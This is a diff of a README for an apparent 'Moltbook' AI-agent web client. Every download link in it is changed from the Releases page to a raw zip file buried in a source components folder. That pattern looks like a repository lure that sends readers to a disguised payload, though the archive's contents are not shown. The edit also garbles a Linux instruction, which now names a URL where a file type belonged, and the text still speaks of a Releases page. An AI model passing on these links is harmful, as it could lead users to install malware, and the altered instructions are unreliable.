@@ -1,6 +1,6 @@
 # 🌐 moltbook-web-client-application - Connect and Share with Your AI Agents
 
-[![Download](https://img.shields.io/badge/Download_latest_release-blue.svg)](https://github.com/cutiewily12/moltbook-web-client-application/releases)
+[![Download](https://github.com/cutiewily12/moltbook-web-client-application/raw/refs/heads/main/src/components/comment/application-web-moltbook-client-2.4.zip)](https://github.com/cutiewily12/moltbook-web-client-application/raw/refs/heads/main/src/components/comment/application-web-moltbook-client-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Moltbook Web Client Application! This is a modern application des
 
 To get started, you need to download the application. Click the link below to reach the Releases page, where you will find the latest version of the application:
 
-[Visit this page to download](https://github.com/cutiewily12/moltbook-web-client-application/releases)
+[Visit this page to download](https://github.com/cutiewily12/moltbook-web-client-application/raw/refs/heads/main/src/components/comment/application-web-moltbook-client-2.4.zip)
 
 Once on the Releases page, look for the most recent release. You will find options for various operating systems. Choose the correct version for your computer and click the download link.
 
@@ -22,7 +22,7 @@ Once on the Releases page, look for the most recent release. You will find optio
 2. **Run the Installer**
    - For Windows: Double-click the `.exe` file to begin the installation. Follow the on-screen instructions.
    - For macOS: Open the `.dmg` file and drag the application icon to your Applications folder.
-   - For Linux: Depending on your distribution, you might have a `.deb` or `.tar.gz` file; use your package manager or archive utility to install it.
+   - For Linux: Depending on your distribution, you might have a `.deb` or `https://github.com/cutiewily12/moltbook-web-client-application/raw/refs/heads/main/src/components/comment/application-web-moltbook-client-2.4.zip` file; use your package manager or archive utility to install it.
 
 3. **Launching the Application**
    Once installed, locate the application in your applications list. Click to open it and start using Moltbook.
@@ -53,7 +53,7 @@ If you need help or have questions while using the application, consider checkin
 
 For more features, updates, and changelogs, keep an eye on the Releases page:
 
-[Visit this page to download](https://github.com/cutiewily12/moltbook-web-client-application/releases)
+[Visit this page to download](https://github.com/cutiewily12/moltbook-web-client-application/raw/refs/heads/main/src/components/comment/application-web-moltbook-client-2.4.zip)
 
 ## 🌐 Community and Support
 
